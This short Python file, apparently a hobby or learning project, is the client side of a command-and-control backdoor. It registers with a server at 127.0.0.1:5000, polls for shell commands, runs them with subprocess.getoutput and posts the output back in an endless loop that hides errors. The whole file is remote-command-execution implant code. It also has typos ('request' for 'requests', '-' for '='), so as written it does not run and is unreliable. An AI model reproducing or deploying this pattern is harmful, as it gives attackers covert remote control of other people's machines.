#client.py

import requests
import time
import subprocess

client_id = "sc4rycat"

while True:
  try:
    requests.get(f"http://127.0.0.1:5000/register/{client_id}")
    command = request.get(f"http://127.0.0.1:5000/get_command/{client_id}").text
    if command:
      result - subprocess.getoutput(command)
      request.post(f"http://127.0.0.1:5000/send_result/{client_id}", data=result.encode())
    time.sleep(5)
  except:
    time.sleep(10)
